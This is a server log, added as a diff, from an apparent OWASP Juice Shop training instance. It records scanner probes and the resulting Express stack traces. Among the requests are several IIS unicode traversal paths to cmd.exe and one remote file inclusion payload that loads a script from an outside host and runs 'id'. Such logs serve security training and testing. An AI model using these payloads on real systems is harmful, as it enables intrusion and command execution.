@@ -1,0 +1,480 @@
+info: Detected Node.js version v22.18.0 (OK)
+info: Detected OS linux (OK)
+info: Detected CPU arm64 (OK)
+info: Configuration default validated (OK)
+info: Entity models 19 of 19 are initialized (OK)
+info: Required file server.js is present (OK)
+info: Required file index.html is present (OK)
+info: Required file runtime.js is present (OK)
+info: Required file main.js is present (OK)
+info: Required file styles.css is present (OK)
+info: Required file tutorial.js is present (OK)
+info: Required file vendor.js is present (OK)
+info: Port 3000 is available (OK)
+info: Chatbot training data botDefaultTrainingData.json validated (OK)
+info: Domain https://www.alchemy.com/ is reachable (OK)
+info: Server listening on port 3000
+Error: Unexpected path: /restore_config.cgi
+    at /juice-shop/build/routes/angular.js:42:18
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at /juice-shop/build/routes/verify.js:187:5
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at /juice-shop/build/routes/verify.js:111:5
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at logger (/juice-shop/node_modules/morgan/index.js:144:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+info: Solved 1-star errorHandlingChallenge (Error Handling)
+info: Cheat score for trivial errorHandlingChallenge solved in 49min (expected ~0min) with hints allowed: 0
+URIError: Failed to decode param '/%NETHOOD%/'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (/juice-shop/node_modules/express/lib/router/layer.js:172:12)
+    at Layer.match (/juice-shop/node_modules/express/lib/router/layer.js:123:27)
+    at matchLayer (/juice-shop/node_modules/express/lib/router/index.js:585:18)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:226:15)
+    at compression (/juice-shop/node_modules/compression/index.js:243:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at expressInit (/juice-shop/node_modules/express/lib/middleware/init.js:40:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at query (/juice-shop/node_modules/express/lib/middleware/query.js:45:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+URIError: Failed to decode param '/%a%s%p%d'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (/juice-shop/node_modules/express/lib/router/layer.js:172:12)
+    at Layer.match (/juice-shop/node_modules/express/lib/router/layer.js:123:27)
+    at matchLayer (/juice-shop/node_modules/express/lib/router/index.js:585:18)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:226:15)
+    at compression (/juice-shop/node_modules/compression/index.js:243:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at expressInit (/juice-shop/node_modules/express/lib/middleware/init.js:40:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at query (/juice-shop/node_modules/express/lib/middleware/query.js:45:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+Error: Unexpected path: /restricted/
+    at /juice-shop/build/routes/angular.js:42:18
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at /juice-shop/build/routes/verify.js:187:5
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at /juice-shop/build/routes/verify.js:111:5
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at logger (/juice-shop/node_modules/morgan/index.js:144:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+URIError: Failed to decode param '/certsrv/..%c0%af../winnt/system32/cmd.exe'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (/juice-shop/node_modules/express/lib/router/layer.js:172:12)
+    at Layer.match (/juice-shop/node_modules/express/lib/router/layer.js:123:27)
+    at matchLayer (/juice-shop/node_modules/express/lib/router/index.js:585:18)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:226:15)
+    at compression (/juice-shop/node_modules/compression/index.js:243:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at expressInit (/juice-shop/node_modules/express/lib/middleware/init.js:40:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at query (/juice-shop/node_modules/express/lib/middleware/query.js:45:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+URIError: Failed to decode param '/cgi-bin/..%c0%af../..%c0%af../winnt/system32/cmd.exe'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (/juice-shop/node_modules/express/lib/router/layer.js:172:12)
+    at Layer.match (/juice-shop/node_modules/express/lib/router/layer.js:123:27)
+    at matchLayer (/juice-shop/node_modules/express/lib/router/index.js:585:18)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:226:15)
+    at compression (/juice-shop/node_modules/compression/index.js:243:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at expressInit (/juice-shop/node_modules/express/lib/middleware/init.js:40:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at query (/juice-shop/node_modules/express/lib/middleware/query.js:45:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+URIError: Failed to decode param '/iisadmpwd/..%c0%af../winnt/system32/cmd.exe'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (/juice-shop/node_modules/express/lib/router/layer.js:172:12)
+    at Layer.match (/juice-shop/node_modules/express/lib/router/layer.js:123:27)
+    at matchLayer (/juice-shop/node_modules/express/lib/router/index.js:585:18)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:226:15)
+    at compression (/juice-shop/node_modules/compression/index.js:243:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at expressInit (/juice-shop/node_modules/express/lib/middleware/init.js:40:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at query (/juice-shop/node_modules/express/lib/middleware/query.js:45:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+URIError: Failed to decode param '/msadc/..%c0%af../..%c0%af../winnt/system32/cmd.exe'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (/juice-shop/node_modules/express/lib/router/layer.js:172:12)
+    at Layer.match (/juice-shop/node_modules/express/lib/router/layer.js:123:27)
+    at matchLayer (/juice-shop/node_modules/express/lib/router/index.js:585:18)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:226:15)
+    at compression (/juice-shop/node_modules/compression/index.js:243:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at expressInit (/juice-shop/node_modules/express/lib/middleware/init.js:40:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at query (/juice-shop/node_modules/express/lib/middleware/query.js:45:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+URIError: Failed to decode param '/pbserver/..%c0%af../..%c0%af../winnt/system32/cmd.exe'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (/juice-shop/node_modules/express/lib/router/layer.js:172:12)
+    at Layer.match (/juice-shop/node_modules/express/lib/router/layer.js:123:27)
+    at matchLayer (/juice-shop/node_modules/express/lib/router/index.js:585:18)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:226:15)
+    at compression (/juice-shop/node_modules/compression/index.js:243:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at expressInit (/juice-shop/node_modules/express/lib/middleware/init.js:40:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at query (/juice-shop/node_modules/express/lib/middleware/query.js:45:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+URIError: Failed to decode param '/rpc/..%c0%af../..%c0%af../winnt/system32/cmd.exe'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (/juice-shop/node_modules/express/lib/router/layer.js:172:12)
+    at Layer.match (/juice-shop/node_modules/express/lib/router/layer.js:123:27)
+    at matchLayer (/juice-shop/node_modules/express/lib/router/index.js:585:18)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:226:15)
+    at compression (/juice-shop/node_modules/compression/index.js:243:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at expressInit (/juice-shop/node_modules/express/lib/middleware/init.js:40:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at query (/juice-shop/node_modules/express/lib/middleware/query.js:45:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+URIError: Failed to decode param '/scripts/..%c0%af../winnt/system32/cmd.exe'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (/juice-shop/node_modules/express/lib/router/layer.js:172:12)
+    at Layer.match (/juice-shop/node_modules/express/lib/router/layer.js:123:27)
+    at matchLayer (/juice-shop/node_modules/express/lib/router/index.js:585:18)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:226:15)
+    at compression (/juice-shop/node_modules/compression/index.js:243:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at expressInit (/juice-shop/node_modules/express/lib/middleware/init.js:40:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at query (/juice-shop/node_modules/express/lib/middleware/query.js:45:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+URIError: Failed to decode param '/scripts/..%c1%1c../winnt/system32/cmd.exe'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (/juice-shop/node_modules/express/lib/router/layer.js:172:12)
+    at Layer.match (/juice-shop/node_modules/express/lib/router/layer.js:123:27)
+    at matchLayer (/juice-shop/node_modules/express/lib/router/index.js:585:18)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:226:15)
+    at compression (/juice-shop/node_modules/compression/index.js:243:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at expressInit (/juice-shop/node_modules/express/lib/middleware/init.js:40:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at query (/juice-shop/node_modules/express/lib/middleware/query.js:45:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+URIError: Failed to decode param '/scripts/..%c1%1c../winnt/system32/cmd.exe'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (/juice-shop/node_modules/express/lib/router/layer.js:172:12)
+    at Layer.match (/juice-shop/node_modules/express/lib/router/layer.js:123:27)
+    at matchLayer (/juice-shop/node_modules/express/lib/router/index.js:585:18)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:226:15)
+    at compression (/juice-shop/node_modules/compression/index.js:243:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at expressInit (/juice-shop/node_modules/express/lib/middleware/init.js:40:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at query (/juice-shop/node_modules/express/lib/middleware/query.js:45:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+URIError: Failed to decode param '/_vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (/juice-shop/node_modules/express/lib/router/layer.js:172:12)
+    at Layer.match (/juice-shop/node_modules/express/lib/router/layer.js:123:27)
+    at matchLayer (/juice-shop/node_modules/express/lib/router/index.js:585:18)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:226:15)
+    at compression (/juice-shop/node_modules/compression/index.js:243:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at expressInit (/juice-shop/node_modules/express/lib/middleware/init.js:40:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at query (/juice-shop/node_modules/express/lib/middleware/query.js:45:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+Error: Unexpected path: /api.php?t_path_core=http:/blog.cirt.net/rfiinc.txt?&cmd=id
+    at /juice-shop/build/routes/angular.js:42:18
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at /juice-shop/build/routes/verify.js:187:5
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at /juice-shop/build/routes/verify.js:111:5
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at logger (/juice-shop/node_modules/morgan/index.js:144:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+Error: Unexpected path: /apidocs/index.html
+    at /juice-shop/build/routes/angular.js:42:18
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at /juice-shop/build/routes/verify.js:187:5
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at /juice-shop/build/routes/verify.js:111:5
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at logger (/juice-shop/node_modules/morgan/index.js:144:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+Error: Unexpected path: /apidocs/
+    at /juice-shop/build/routes/angular.js:42:18
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at /juice-shop/build/routes/verify.js:187:5
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at /juice-shop/build/routes/verify.js:111:5
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at logger (/juice-shop/node_modules/morgan/index.js:144:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+Error: Unexpected path: /api/soap/?wsdl=1
+    at /juice-shop/build/routes/angular.js:42:18
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at /juice-shop/build/routes/verify.js:187:5
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at /juice-shop/build/routes/verify.js:111:5
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
